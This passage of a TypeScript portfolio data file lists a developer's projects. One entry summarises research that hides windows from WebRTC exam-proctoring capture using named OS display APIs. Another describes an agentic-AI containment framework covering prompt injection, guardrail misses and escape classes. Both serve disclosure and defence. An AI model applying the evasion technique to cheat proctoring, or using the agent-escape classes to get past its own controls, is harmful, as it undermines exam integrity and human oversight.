import { Locale } from "@/i18n";

export interface ProjectPaper {
  title: string;
  label: string;
  href: string;
  kind: "download" | "external";
  venue?: string;
  year?: string;
  status?: string;
  description?: string;
  doi?: string;
}

export interface Project {
  slug: string;
  title: string;
  category: "OFFENSIVE" | "DEFENSIVE" | "ENGINEERING";
  year: string;
  // Optional ISO date of the last meaningful content update for THIS project.
  // Drives sitemap `lastModified` + JSON-LD `dateModified`; falls back to the
  // site-level revision date when absent, so builds don't fake per-page freshness.
  updatedAt?: string;
  description: string;
  localizedDescription?: Partial<Record<Locale, string>>;
  fullDescription: string;
  localizedFullDescription?: Partial<Record<Locale, string>>;
  tags: string[];
  links: {
    demo?: string;
    repo?: string;
    caseStudy?: string;
    paper?: string;
    doi?: string;
    preprint?: string;
  };
  papers?: ProjectPaper[];
  citation?: string;
  build: {
    stack: string[];
    features: string[];
  };
  secure: {
    measures: string[];
  };
  problem: string;
  solution: string[];
  proof: string[];
}

export function getProjectDescription(p: Project, locale: Locale): string {
  return p.localizedDescription?.[locale] || p.description;
}

export function getProjectFullDescription(p: Project, locale: Locale): string {
  return p.localizedFullDescription?.[locale] || p.fullDescription;
}

export const projects: Record<string, Project> = {
  "invisible-window-research": {
    slug: "invisible-window-research",
    title: "Invisible Window Research",
    category: "OFFENSIVE",
    year: "2026",
    description:
      "IEEE-format research paper exposing a structural vulnerability in WebRTC-based exam proctoring. 100% evasion on Windows 10/11 and macOS 14–26 using documented OS display APIs. Responsibly disclosed to vendors.",
    localizedDescription: {
      fa: "مقاله تحقیقاتی با فرمت IEEE که آسیب‌پذیری ساختاری در نظارت بر امتحانات مبتنی بر WebRTC را فاش می‌کند. فرار ۱۰۰ درصدی در ویندوز و مک با استفاده از APIهای مستند سیستم‌عامل.",
      ar: "ورقة بحثية بتنسيق IEEE تكشف عن ثغرة أمنية هيكلية في مراقبة الاختبارات القائمة على WebRTC. تهرب بنسبة ١٠٠٪ على نظامي التشغيل Windows و macOS باستخدام واجهات برمجة تطبيقات عرض نظام التشغيل الموثقة.",
      zh: "IEEE 格式的研究论文，揭示了基于 WebRTC 的在线监考系统中的结构性漏洞。利用记录在案的 OS 显示 API，在 Windows 和 macOS 上实现 100% 规避。",
      es: "Artículo de investigación en formato IEEE que expone una vulnerabilidad estructural en la supervisión de exámenes basada en WebRTC. Evasión del 100% en Windows y macOS utilizando APIs de pantalla documentadas del SO.",
    },
    tags: [
      "Security Research",
      "Windows",
      "macOS",
      "WebRTC",
      "Responsible Disclosure",
      "PoC",
    ],
    links: {
      repo: "https://github.com/Raoof128/invisible-window-research",
      paper: "/Invisible_Window_Research_Preprint_V2.0.pdf",
      preprint: "https://zenodo.org/records/20376495",
      caseStudy: "/projects/invisible-window-research",
    },
    papers: [
      {
        title:
          "The Invisible Window: Exploiting OS-Level Display Affinity to Bypass WebRTC Proctoring Systems",
        label: "IEEE-format preprint",
        href: "/Invisible_Window_Research_Preprint_V2.0.pdf",
        kind: "download",
        venue: "Zenodo",
        year: "2026",
        status: "CC BY 4.0 preprint",
        description:
          "13-page research paper documenting cross-platform screen-capture evasion and coordinated vendor disclosure.",
        doi: "10.5281/zenodo.20376495",
      },
    ],
    citation:
      "Abedini, M. R. (2026). The Invisible Window: Exploiting OS-Level Display Affinity to Bypass WebRTC Proctoring Systems. Zenodo. https://doi.org/10.5281/zenodo.20376495",
    build: {
      stack: [
        "Win32 C (Windows PoC)",
        "Swift / AppKit (macOS PoC)",
        "Python (pixel-level forensic verification)",
        "LaTeX (IEEE conference template, 13 pages, 53 references)",
      ],
      features: [
        "SetWindowDisplayAffinity + WDA_EXCLUDEFROMCAPTURE (Windows 10 v2004+) — excludes window from all screen capture APIs with zero visual artefact",
        "NSWindow.SharingType.none (macOS) — hides window from CGWindowListCreateImage and ScreenCaptureKit-backed capture on macOS 14–26",
        "Pixel-level forensic verification: 80.27% pixel difference in Windows capture footprint; 1,170,560-pixel macOS capture returned fully transparent",
        "Empirical contradiction of the community assumption that macOS 15+ mitigated the attack vector",
      ],
    },
    secure: {
      measures: [
        "Discovery and verification (January 2026)",
        "Microsoft MSRC notified (February 2026) — classified as by-design, not a security vulnerability (April 2026)",
        "Apple Product Security notified (March 2026) — classified as consistent with documented functionality, not a security issue (March 2026)",
        "Public release following OS vendor responses (May 2026)",
        "Proof-of-concept source code withheld; available to verified security researchers on request",
        "Uses only documented, user-level OS APIs — no kernel exploits, no privilege escalation",
        "Aligned with ACM and IEEE codes of ethics and CISA coordinated disclosure guidelines",
      ],
    },
    fullDescription:
      "A 13-page IEEE-format research paper documenting a structural vulnerability in WebRTC-based exam proctoring. Operating systems expose documented APIs, SetWindowDisplayAffinity on Windows and NSWindow.SharingType.none on macOS, that let any application render its window invisible to screen capture while remaining fully visible on the physical display. Proctoring systems that rely on getDisplayMedia() for integrity enforcement are structurally bypassed. Proof-of-concept implementations achieved 100% evasion across all tested platforms, including macOS 26 where the attack was previously assumed mitigated.",
    problem:
      "Remote proctoring systems detect prohibited content by capturing the student's screen via the WebRTC getDisplayMedia() API. The implicit security assumption is that the captured frame faithfully represents the physical display. This assumption is false. Both Windows and macOS provide documented, publicly supported APIs that exclude application windows from all screen capture pipelines without privilege escalation, kernel modification, or detectable side effects. The integrity guarantee offered by capture-based proctoring is structurally broken.",
    solution: [
      "Formalised the trust-boundary violation between the W3C Screen Capture API and the OS compositing pipeline",
      "Surveyed SetWindowDisplayAffinity (Win32) and NSWindow.SharingType.none (macOS) — both documented in official SDK references",
      "Built proof-of-concept implementations in Win32 C (Windows) and Swift (macOS) demonstrating full screen-capture evasion",
      "Evaluated against representative WebRTC proctoring configurations in a controlled lab on Windows 10/11 and macOS 14–26",
      "Analysed which behavioural detection mechanisms (gaze tracking, mouse dynamics, process enumeration) can and cannot detect the attack",
      "Proposed and assessed five countermeasures, ranging from deployable (flag enumeration) to long-term (hardware attestation)",
      "Coordinated OS vendor disclosure: Microsoft MSRC (Feb 2026) and Apple Product Security (Mar 2026) both responded with formal classifications",
    ],
    proof: [
      "100% evasion rate across Windows 10/11 and macOS 14–26, measured over 10,000+ frames per configuration",
      "Zero visual artefacts detected in captured frames (no black rectangles, compositing errors, or flicker)",
      "macOS 26.3.1 remains fully vulnerable despite Apple's documented ScreenCaptureKit changes in macOS 15 — contradicting prevailing community assumptions",
      "Linux (X11/Wayland) confirmed not vulnerable — no equivalent display affinity API exists in tested configurations",
      "Behavioural detection ineffective — gaze tracking (p = 0.41, n = 8) and mouse dynamics fell within normal exam-behaviour variance",
      "Process-level detection theoretically possible but not implemented by any current browser-based proctoring system",
      "Published as Zenodo preprint under CC BY 4.0 — DOI 10.5281/zenodo.20376495 — 13 pages, 53 references, IEEE conference format",
    ],
  },
  "project-simurgh": {
    slug: "project-simurgh",
    title: "Project Simurgh",
    category: "DEFENSIVE",
    year: "2026",
    description:
      "Provider-agnostic verifiable containment-attestation framework for agentic AI, evolved from the defensive counterpart to The Invisible Window research. Produces Ed25519-signed, offline-reproducible evidence of what an AI agent was allowed to do after a guardrail miss — contained 138/138 classifier-missed cases and cut a live agent's attack success from 9/140 to 0/140 on AgentDojo.",
    localizedDescription: {
      fa: "چارچوب گواهی مهارِ قابل‌راستی‌آزمایی و مستقل از ارائه‌دهنده برای هوش مصنوعی عامل‌محور، برآمده از همتای دفاعیِ تحقیقات The Invisible Window. شواهد امضاشده با Ed25519 و بازتولیدپذیر به‌صورت آفلاین از آنچه یک عامل هوش مصنوعی پس از عبور از حفاظ مجاز به انجامش بوده تولید می‌کند — ۱۳۸ از ۱۳۸ مورد ازدست‌رفته توسط طبقه‌بند را مهار کرد و نرخ موفقیت حمله یک عامل زنده را در AgentDojo از ۹ از ۱۴۰ به ۰ از ۱۴۰ رساند.",
      ar: "إطار عمل لإثبات الاحتواء القابل للتحقق ومستقل عن المزوّد للذكاء الاصطناعي الوكيلي، تطوّر عن النظير الدفاعي لأبحاث The Invisible Window. يُنتج أدلة موقّعة بـ Ed25519 وقابلة لإعادة الإنتاج دون اتصال حول ما سُمح لوكيل الذكاء الاصطناعي بفعله بعد إخفاق الحاجز — احتوى ١٣٨ من ١٣٨ حالة فاتت المصنّف، وخفّض نجاح هجوم وكيل حي من ٩ من ١٤٠ إلى ٠ من ١٤٠ على AgentDojo.",
      zh: "面向智能体 AI 的、与提供方无关的可验证遏制证明框架，由《The Invisible Window》研究的防御性对应项演进而来。生成 Ed25519 签名、可离线复现的证据，记录在防护失效后 AI 智能体被允许做了什么——遏制了分类器漏掉的 138/138 个案例，并在 AgentDojo 上将一个实时智能体的攻击成功率从 9/140 降至 0/140。",
      es: "Marco de atestación de contención verificable e independiente del proveedor para IA agéntica, evolucionado desde la contraparte defensiva de la investigación The Invisible Window. Produce evidencia firmada con Ed25519 y reproducible sin conexión de lo que se permitió hacer a un agente de IA tras un fallo de la barrera de seguridad: contuvo 138/138 casos que el clasificador pasó por alto y redujo el éxito de ataque de un agente en vivo de 9/140 a 0/140 en AgentDojo.",
    },
    tags: [
      "Containment Attestation",
      "Agentic AI Safety",
      "Prompt-Injection",
      "Ed25519",
      "LLM Red-Teaming",
      "AGPL-3.0",
    ],
    links: {
      repo: "https://github.com/Raoof128/Project-Simurgh",
      paper: "/Project_Simurgh_Preprint_v1.0.pdf",
      preprint: "https://zenodo.org/records/20374849",
      caseStudy: "/projects/project-simurgh",
    },
    papers: [
      {
        title:
          "Project Simurgh: Privacy-Preserving Device Integrity Proofs for Capture-Resistant High-Stakes Sessions",
        label: "IEEE-format preprint",
        href: "/Project_Simurgh_Preprint_v1.0.pdf",
        kind: "download",
        venue: "Zenodo",
        year: "2026",
        status: "CC BY 4.0 preprint",
        description:
          "12-page defensive follow-up to The Invisible Window, replacing visual surveillance with metadata-only integrity proofs.",
        doi: "10.5281/zenodo.20374849",
      },
      {
        title:
          "Privacy-Preserving Integrity Evidence for Student-Society Voting-Adjacent Workflows: A Phase C Pilot of Project Simurgh at Macquarie University",
        label: "Supplement preprint",
        href: "/Project_Simurgh_Voting_Adjacent_Supplement_Phase_C_Preprint_v1.0.pdf",
        kind: "download",
        venue: "Zenodo",
        year: "2026",
        status: "Phase C preprint",
        description:
          "5-page voting-adjacent pilot reporting 31 consented sessions alongside a Macquarie student-society event, with ballot-choice exclusion, HMAC audit chaining, forbidden-field rejection, and 5/5 collection-closure gates.",
        doi: "10.5281/zenodo.20549736",
      },
      {
        title:
          "Banking Shield: Machine-Checked Absence Claims for Privacy-Sensitive AI Explanations",
        label: "Banking-adjacent preprint",
        href: "/Banking_Shield_Machine_Checked_Absence_Claims_Preprint_v1.2.pdf",
        kind: "download",
        venue: "Zenodo",
        year: "2026",
        status: "Author-prepared preprint",
        description:
          "Fictional, non-bank research prototype that turns privacy and overclaim boundaries into machine-checkable evidence: a 46-name forbidden-field firewall whose rejections become audit events, a deterministic offline AI privacy firewall, and per-response privacy receipts anchored in per-session HMAC audit chains. At the evidence freeze all 417/417 unit tests, 43/43 end-to-end checks, and 27/27 security checks passed across three privacy audits and a no-egress static gate, with a formative five-tester dry run (30 sessions) recording zero sensitive values in evidence and 5/5 non-claim checklist comprehension.",
        doi: "10.5281/zenodo.20675513",
      },
    ],
    citation:
      "Abedini, M. R. (2026). Project Simurgh: Privacy-Preserving Device Integrity Proofs for Capture-Resistant High-Stakes Sessions. Zenodo. https://doi.org/10.5281/zenodo.20374849",
    build: {
      stack: [
        "Node.js / JavaScript containment gateway",
        "Ed25519-signed, offline-reproducible evidence packs",
        "JS ↔ Python byte-parity verifier",
        "Lean 4 machine-checked theorems",
        "GitHub OIDC second provenance root",
      ],
      features: [
        "Four containment boundaries — input firewall, context-provenance guard, tool-invocation gate, output-leakage firewall — each emitting signed evidence",
        "Dishonest-producer threat model: decision-replay and emission-completeness checks catch falsified or dropped evidence, verifiable offline by a hostile reviewer",
        "Multi-class escape taxonomy (containment escape, verifier deception, out-of-scope, gate-boundary evasion) with reproducible adaptive red-team campaigns",
        "Verifiable friction receipts prove an approval checkpoint preceded every protected authority crossing via a distinct-key pincer that defeats self-approval and backdating",
      ],
    },
    secure: {
      measures: [
        "Producer-independent verifier trusts only the signer's public key and runs with no network — confirms a real containment claim and falsifies a dishonest one",
        "Self-red-teamed the attestation core across eight attack classes (tamper, key-swap, canonical-laundering, digest-collision, cross-stage replay, self-proof mutation, policy drift); trust root held, two detector weaknesses versioned into detector-v2 and re-tested",
        "Producer-independent witness cross-checks every signed receipt against an independent consequence oracle: zero false accusations, zero missed lies across the fixtures",
        "Five machine-checked Lean theorems (fail-closed, friction precedence, same-key-fails, friction coverage, no-silent-exemption)",
        "Honest non-claims are signed and explicit: not a jailbreak detector, complementary post-filter, and it would not have caught the June 2026 content-generation bypass itself",
      ],
    },
    fullDescription:
      "Project Simurgh is a provider-agnostic verifiable containment-attestation framework for agentic AI. It began as the defensive counterpart to The Invisible Window research, a metadata-only integrity layer for high-stakes sessions, and evolved into a general receipt for what a deployed AI agent was allowed to do after its first line of defense fails. Capability evaluations show what a model can do; Simurgh produces signed, offline-reproducible evidence of what a system let it do once it was connected to tools, files, context, and external systems. The classifier governs what a model may say; Simurgh attests what the agent was allowed to do, to a hostile reviewer, with no producer access.",
    problem:
      "Most AI defences optimise the first line: stopping the bad input. Anthropic's own Redeploying Fable 5 post concedes classifiers can be jailbroken, safety margins cost false positives, and full robustness is probably impossible. When that line fails, a prompt injection, a jailbreak, a tool-authority slip, there is neither a downstream layer that limits what the failure can do nor an evidence standard that lets an operator prove, to a skeptic, what actually happened. The threat model is a dishonest producer: an operator who wants to look contained.",
    solution: [
      "Wraps an agent in four containment boundaries and seals each run into an Ed25519-signed, metadata-only evidence pack that re-derives byte-for-byte offline",
      "Assumes the evidence producer lies — decision replay and emission-completeness checks let an outside reviewer confirm a real containment claim and falsify a dishonest one",
      "Publishes a containment-utility Pareto frontier and a 12-rung reproduction ladder that an outsider recomputes with no model and no producer access",
      "Positions as the defense-in-depth layer complementary to inline classifiers — the agent-authority cell a content classifier never touches — with a signed non-claim that it would not have caught the June 2026 content bypass",
      "Preserves its published lineage: the Invisible Window integrity origin and the machine-checked absence-claims work (Banking Shield) both feed the current attestation contract",
    ],
    proof: [
      "Real Llama Guard 4 12B input classifier over a 180-case run-set: contained 138/138 malicious cases the classifier missed (120 downstream-injection cases an input-only classifier structurally cannot see, 18 direct-input misses); combined targeted attack-success 0/150; zero unsafe tool executions or exports",
      "Live agent (self-hosted Llama-3.3-70B) on AgentDojo's workspace suite, 140 pre-registered injection cases: authority gate cut targeted attack-success from 9/140 to 0/140 with benign utility held",
      "Second independent provenance root signs the release verdict with GitHub's OIDC identity, not the developer's key; the workflow fails closed before signing if reality diverges from the committed verdict by a single byte",
      "989 automated tests across 44 releases; one-command offline reproduction of the signed release ladder; AGPL-3.0",
      "Published lineage on Zenodo (CC BY 4.0): the original integrity preprint (DOI 10.5281/zenodo.20374849), a voting-adjacent Phase C pilot, and the Banking Shield absence-claims prototype",
    ],
  },
  "project-zurvan": {
    slug: "project-zurvan",
    title: "Project Zurvan",
    category: "ENGINEERING",
    year: "2026",
    description:
      "Local-first LLM knowledge engine. Ingests any document, extracts structured knowledge (claims, concepts, entities, decisions), and exposes it to AI agents via an MCP stdio server. 183 tests passing.",
    localizedDescription: {
      fa: "موتور دانش مبتنی بر هوش مصنوعی و محلی‌محور. اسناد را دریافت می‌کند، دانش ساختاریافته استخراج می‌کند و از طریق سرور MCP در اختیار عامل‌های هوش مصنوعی قرار می‌دهد. ۱۸۳ آزمون موفق.",
      ar: "محرك معرفة محلي يعمل بالذكاء الاصطناعي. يستوعب أي مستند، يستخرج المعرفة المنظمة (ادعاءات، مفاهيم، كيانات، قرارات)، ويعرضها لعوامل الذكاء الاصطناعي عبر خادم MCP. ١٨٣ اختباراً ناجحاً.",
      zh: "本地优先的 LLM 知识引擎。摄取任意文档，提取结构化知识（声明、概念、实体、决策），并通过 MCP stdio 服务器将其暴露给 AI 代理。183 个测试通过。",
      es: "Motor de conocimiento LLM local. Ingiere cualquier documento, extrae conocimiento estructurado (afirmaciones, conceptos, entidades, decisiones) y lo expone a agentes de IA mediante un servidor MCP stdio. 183 pruebas aprobadas.",
    },
    tags: [
      "Python",
      "LLM",
      "MCP",
      "Knowledge Graph",
      "SQLite",
      "Local-first",
      "AI Agents",
    ],
    links: {
      repo: "https://github.com/Raoof128/Project-Zurvan",
      caseStudy: "/projects/project-zurvan",
    },
    build: {
      stack: [
        "Python 3.10+",
        "SQLite FTS5 (hybrid search)",
        "MCP stdio server",
        "OpenAI / Anthropic / Mock LLM providers",
        "Obsidian-compatible vault layout",
      ],
      features: [
        "Ingests Markdown, PDF, TXT, and images into a linked, searchable, git-friendly wiki",
        "LLM extraction layer produces typed knowledge nodes: claims, concepts, entities, and decisions — compounded additively across sources",
        "Hybrid FTS5 + semantic search with graph-neighbour expansion surfaces dense context bundles for agent prompts",
        "MCP stdio server exposes zurvan_search, zurvan_context, zurvan_remember, zurvan_decision_add, and graph tools to Claude Code and Cursor",
        "Multi-project federation — cross-vault search, contradiction detection, and policy radar across independent vaults",
        "183 tests passing across 18 completed phases",
      ],
    },
    secure: {
      measures: [
        "Local-first by design — no cloud storage or external transmission of document content",
        "MCP server is read-only by default; write mode requires explicit opt-in flag",
        "Project paths stored in ~/.zurvan/projects.json — never committed to version control",
        "Mock LLM provider available for safe dev/test without API key exposure",
        "Agent memory isolated per vault; cross-vault federation requires explicit registration",
      ],
    },
    fullDescription:
      "Project Zurvan is a local-first LLM knowledge engine that turns raw documents into a linked, searchable, git-friendly wiki, then exposes that wiki to AI agents via a Model Context Protocol (MCP) server. Inspired by Andrej Karpathy's personal knowledge management gist, Zurvan is designed for researchers, engineers, and agents that need structured long-term memory without cloud lock-in.",
    problem:
      "LLM agents lack persistent, structured memory that survives between sessions. Existing RAG pipelines either require cloud infrastructure or lose the relational structure of knowledge, which claim supports which decision, which concept contradicts another. A local-first solution needs to ingest arbitrary documents, preserve knowledge relationships as a graph, and present the result to agents in a queryable, privacy-preserving format.",
    solution: [
      "Built a local document ingestion pipeline (MD, PDF, TXT, images) feeding a SQLite-backed knowledge store",
      "LLM extraction layer produces typed nodes — claims, concepts, entities, decisions — compounded additively across sources as the corpus grows",
      "Hybrid FTS5 + semantic search with graph-neighbour expansion surfaces deep context bundles for agent prompts",
      "MCP stdio server exposes zurvan_search, zurvan_context, zurvan_remember, zurvan_decision_add, and graph tools to Claude Code and Cursor",
      "Multi-project federation manages independent vaults with cross-vault search, contradiction detection, and policy drift radar",
    ],
    proof: [
      "183 tests passing across 18 completed development phases",
      "MCP server verified with Claude Code and Cursor client setup guides",
      "Obsidian vault integration with colour-coded 7-type knowledge graph (claims, concepts, entities, decisions, sessions, contradictions, syntheses)",
      "Evidence pack → report → review → publish pipeline runs fully offline",
      "Agent workflow orchestration (preflight / postedit / session close) documented for Claude Code and Codex",
    ],
  },
  gitswitch: {
    slug: "gitswitch",
    title: "GitSwitch",
    category: "ENGINEERING",
    year: "2024",
    description:
      "AI-powered Git client for managing multiple identities and generating semantic commits. Built with Electron and React.",
    localizedDescription: {
      fa: "کلاینت گیت مجهز به هوش مصنوعی برای مدیریت چندین هویت و ایجاد کامیت‌های معنایی. ساخته شده با Electron و React.",
      ar: "عميل Git مدعوم بالذكاء الاصطناعي لإدارة هويات متعددة وإنشاء تعهدات (commits) دلالية. تم بناؤه باستخدام Electron و React.",
      zh: "人工智能驱动的 Git 客户端，用于管理多个身份并生成语义化提交。使用 Electron 和 React 构建。",
      es: "Cliente Git potenciado por IA para gestionar múltiples identidades y generar commits semánticos. Construido con Electron y React.",
    },
    tags: ["Electron", "React", "TypeScript", "AI", "Dev Tool"],
    links: {
      repo: "https://github.com/Raoof128/GitSwitch",
      caseStudy: "/projects/gitswitch",
    },
    build: {
      stack: [
        "Electron",
        "React 19",
        "TypeScript",
        "Zustand",
        "Google Gemini AI",
      ],
      features: [
        "Multi-Account Management (Personal, Work)",
        "AI Commit Generation (Gemini 3)",
        "Smart Diff Viewer with syntax highlighting",
        "Drag & Drop repository management",
      ],
    },
    secure: {
      measures: [
        "API keys redacted from logs & wiped from memory",
        "Secure OS-keychain storage for secrets",
        "Enforced timeouts & input sanitization",
        "Privacy First design",
      ],
    },
    fullDescription:
      "Gitswitch is an AI-powered Git client for developers who juggle multiple accounts and repositories. It switches git identities and writes semantic commit messages.",
    problem:
      "Developers often struggle with managing multiple git identities (personal vs work) and writing consistent commit messages.",
    solution: [
      "Built an identity switcher for global and local git config",
      "Integrated Gemini 3 AI for semantic commit generation",
      "Built a secure, modern Electron app with strict isolation",
      "Implemented smart diff viewing for better code review",
    ],
    proof: [
      "Secure OS-keychain integration",
      "Memory wiping for API keys",
      "React 19 + Electron 33 modern stack",
      "Cyberpunk-inspired UI",
    ],
  },
  "mehr-guard": {
    slug: "mehr-guard",
    title: "Mehr Guard",
    category: "DEFENSIVE",
    year: "2024",
    description:
      "Privacy-first offline QR & URL security scanner built with Kotlin Multiplatform. 100% offline analysis with 5 platform targets.",
    localizedDescription: {
      fa: "اسکنر امنیتی QR و URL آفلاین با اولویت حریم خصوصی که با Kotlin Multiplatform ساخته شده است. آنالیز ۱۰۰٪ آفلاین با ۵ پلتفرم هدف.",
      ar: "ماسح ضوئي أمني لرموز QR وعناوين URL يعمل بدون اتصال بالإنترنت مع إعطاء الأولوية للخصوصية، تم بناؤه باستخدام Kotlin Multiplatform. تحليل بنسبة ١٠٠٪ بدون اتصال بالإنترنت مع استهداف ٥ منصات.",
      zh: "优先考虑隐私的离线 QR 和 URL 安全扫描器，使用 Kotlin Multiplatform 构建。100% 离线分析，支持 5 个目标平台。",
      es: "Escáner de seguridad de QR y URL offline que prioriza la privacidad, construido con Kotlin Multiplatform. Análisis 100% offline con 5 plataformas de destino.",
    },
    tags: ["KMP", "Security Tool", "Android", "iOS", "Desktop", "Web"],
    links: {
      demo: "https://raoof128.github.io/dashboard.html",
      repo: "https://github.com/Raoof128/Raoof128.github.io",
      caseStudy: "/projects/mehr-guard",
    },
    build: {
      stack: [
        "Kotlin Multiplatform",
        "Compose Multiplatform",
        "SwiftUI",
        "ML Kit",
        "SQLDelight",
      ],
      features: [
        "5 Platform Targets (Android, iOS, JVM, JS, Wasm)",
        "Ensemble ML Model (Logistic Regression + Gradient Boosting)",
        "Brand-impersonation, homograph-attack & malicious-redirect detection",
        "Heuristics Engine (25+ checks)",
        "Built-in red-team suite (19 curated attack scenarios)",
      ],
    },
    secure: {
      measures: [
        "100% Offline Analysis (Zero network calls)",
        "On-device ML & Heuristics",
        "No data collection",
        "Privacy by Architecture",
      ],
    },
    fullDescription:
      "Mehr Guard is a privacy-first QR code and URL security scanner built with Kotlin Multiplatform. It detects phishing attacks, brand impersonation, and malicious redirects entirely on-device.",
    problem:
      "QR codes are a common vector for phishing, but most scanners upload data to the cloud, compromising privacy. Users need a way to verify URLs without leaking their browsing history.",
    solution: [
      "Built a 100% offline analysis engine using Kotlin Multiplatform",
      "Implemented an ensemble ML model + 25 heuristics for high accuracy",
      "Targeted 5 platforms (Android, iOS, Desktop, Web) with ~52% code sharing",
      "Achieved <5ms latency for real-time scanning",
    ],
    proof: [
      "F1 Score: 87% on red team corpus",
      "Performance: <5ms P99 latency",
      "1,248+ automated tests plus a built-in red-team suite of 19 curated attack scenarios",
      "Privacy: Verified 0 network calls via ./judge/verify_offline.sh",
      "Code Sharing: ~100% shared detection logic",
    ],
  },
  "syllabus-sync": {
    slug: "syllabus-sync",
    title: "Syllabus-Sync",
    category: "ENGINEERING",
    year: "2026",
    description:
      "AI-native Campus OS transforming university PDF syllabi into structured, agent-readable data. Accepted into the Macquarie University Incubator as a formal startup. Full student operations suite with 503 tests across 92 files, live at syllabus-sync.app.",
    localizedDescription: {
      fa: "سیستم‌عامل دانشگاهی بومی هوش مصنوعی که سرفصل‌های PDF دانشگاه را به داده‌های ساختاریافته و قابل خواندن توسط عامل تبدیل می‌کند. پذیرفته‌شده در مرکز رشد دانشگاه مک‌کواری به‌عنوان یک استارتاپ رسمی. مجموعه کامل عملیات دانشجویی با ۵۰۳ تست.",
      ar: "نظام تشغيل جامعي يعتمد على الذكاء الاصطناعي يحول المناهج الدراسية بتنسيق PDF إلى بيانات منظمة قابلة للقراءة من قبل الوكلاء. مقبول في حاضنة جامعة ماكواري كشركة ناشئة رسمية. حزمة كاملة لعمليات الطلاب مع ٥٠٣ اختبارات.",
      zh: "人工智能原生的校园操作系统，将大学 PDF 教学大纲转化为结构化的、代理可读的数据。已被麦考瑞大学孵化器录取为正式创业公司。包含全套学生操作套件，涵盖 92 个文件中的 503 个测试。",
      es: "Campus OS nativo de IA que transforma los programas universitarios en PDF en datos estructurados y legibles por agentes. Aceptado en la Incubadora de la Universidad Macquarie como startup formal. Suite completa de operaciones estudiantiles con 503 pruebas en 92 archivos.",
    },
    tags: [
      "MQ Incubator Startup",
      "Next.js 16",
      "Supabase",
      "TypeScript",
      "AI/LLM",
      "WebAuthn",
    ],
    links: {
      demo: "https://www.syllabus-sync.app/",
      repo: "https://github.com/Raoof128/syllabus-sync",
      caseStudy: "/projects/syllabus-sync",
    },
    build: {
      stack: [
        "Next.js 16",
        "TypeScript 5",
        "Supabase PostgreSQL",
        "TanStack Query",
        "Leaflet + Google Maps",
        "Framer Motion",
        "Radix UI",
        "Sentry",
      ],
      features: [
        "LLM OCR pipeline extracting structured JSON from PDF syllabi",
        "Syllabus-as-Code — assessments and deadlines as version-controlled artefacts",
        "Full student OS: calendar, reminders, campus map, notifications",
        "503 tests across 92 files with CI/CD quality gates",
      ],
    },
    secure: {
      measures: [
        "Zero-Trust proxy middleware — every route authenticated by default",
        "Supabase Row-Level Security enforced at database layer",
        "WebAuthn/FIDO2 passkey authentication (no passwords stored)",
        "LLM prompt injection mitigation with schema-constrained output and input sanitisation",
        "Secrets scanner in CI blocks credential patterns from commits",
      ],
    },
    fullDescription:
      "Syllabus Sync is an AI-native Campus OS that transforms static university PDF syllabi into structured, agent-readable data and wraps them in a full student operations suite, calendar, map, notifications, and multi-profile management. It has been accepted into the Macquarie University Incubator as a formal startup and runs in production at syllabus-sync.app.",
    problem:
      "Australian universities publish syllabi as unstructured PDFs. Students manually copy assessment dates into calendars, and AI assistants hallucinate deadlines because no machine-readable source of truth exists.",
    solution: [
      "Built an LLM OCR pipeline that extracts structured JSON from PDF syllabi with Zod schema validation",
      "Implemented Syllabus-as-Code where assessments and deadlines are version-controlled, diff-able artefacts",
      "Created a full student OS with calendar, campus navigation (Leaflet + Google Maps), and push notifications",
      "Architected for fork-ability — any Australian university can adopt by swapping data/ and environment variables",
    ],
    proof: [
      "Accepted into the Macquarie University Incubator as a formal startup (2026)",
      "Live in production at syllabus-sync.app",
      "503 tests across 92 files — all passing in CI",
      "Zero-Trust proxy catches misconfiguration by default (validated in production)",
      "Designed to serve ~47,000 MQ students; fork-ready for 1M+ across Australian universities",
      "WebAuthn passkey auth — no shared secrets leave the device",
    ],
  },
  "divan-open-day": {
    slug: "divan-open-day",
    title: "Divan — Open Day",
    category: "ENGINEERING",
    year: "2026",
    description:
      "Bilingual (English/Persian) offline-first Hafez & Rumi poetry experience built for a Persian Society Open Day stall. Visitors pick a poet and receive one reviewed verse with translation, source, and recitation — with no cookies, trackers, or backend.",
    localizedDescription: {
      fa: "تجربه‌ی دوزبانه (فارسی/انگلیسی) و آفلاین‌محورِ شعر حافظ و مولوی که برای غرفه‌ی روز باز انجمن ایرانیان ساخته شده است. بازدیدکننده یک شاعر را برمی‌گزیند و یک بیتِ بازبینی‌شده همراه با ترجمه، منبع و صوت دریافت می‌کند — بدون هیچ کوکی، ردیاب یا سرور.",
      ar: "تجربة شعرية ثنائية اللغة (الإنجليزية/الفارسية) تعمل دون اتصال أولًا لأشعار حافظ ومولوي، صُممت لجناح اليوم المفتوح للجمعية الفارسية. يختار الزائر شاعرًا فيتلقى بيتًا مُراجَعًا مع ترجمته ومصدره وتلاوته — دون أي ملفات تعريف ارتباط أو مُتتبِّعات أو خادم.",
      zh: "为波斯学生会开放日展位打造的双语（英语/波斯语）、离线优先的哈菲兹与鲁米诗歌体验。访客选择一位诗人，即可获得一句经过审校的诗句及其译文、出处与吟诵——没有任何 cookie、追踪器或后端。",
      es: "Experiencia de poesía bilingüe (inglés/persa) y offline-first de Hafez y Rumi creada para un stand de la Jornada de Puertas Abiertas de la Sociedad Persa. El visitante elige un poeta y recibe un verso revisado con traducción, fuente y recitación, sin cookies, rastreadores ni backend.",
    },
    tags: [
      "React 19",
      "Vite",
      "TypeScript",
      "Offline-First",
      "Privacy by Design",
      "i18n / RTL",
    ],
    links: {
      demo: "https://divan.raoufabedini.dev/",
      repo: "https://github.com/Raoof128/divan-open-day",
      caseStudy: "/projects/divan-open-day",
    },
    build: {
      stack: [
        "Vite",
        "React 19",
        "strict TypeScript",
        "Hand-written service worker",
        "Web Crypto (shuffle bag)",
        "Vitest (unit / component / a11y / offline)",
        "Playwright (Chromium e2e)",
        "pnpm 10.33 · Node 22.16",
      ],
      features: [
        "Reviewed bilingual corpus: exactly 60 Hafez + 60 Rumi = 120 verses, each bound to an immutable edition with documented source provenance",
        "Fair, unbiased verse selection via a Web Crypto shuffle bag — computed entirely on-device with no server involvement",
        "Offline-first: a hand-written service worker with integrity verification keeps the stall running on flaky venue networks",
        "Culturally distinct art direction per poet with live Nastaliq typography (real Persian script, never rasterized images)",
        "Bilingual markup with directional text handling, bidirectional isolation, live regions, forced-colors and reduced-motion support",
      ],
    },
    secure: {
      measures: [
        "Privacy by construction: no cookies, identifiers, trackers, or visitor input; nothing is transmitted",
        "No backend, database, or analytics infrastructure — a purely static client",
        "Only public release/poem IDs persisted in sessionStorage; motion preference stored locally only",
        "Production compiler rejects synthetic/test data before deployment",
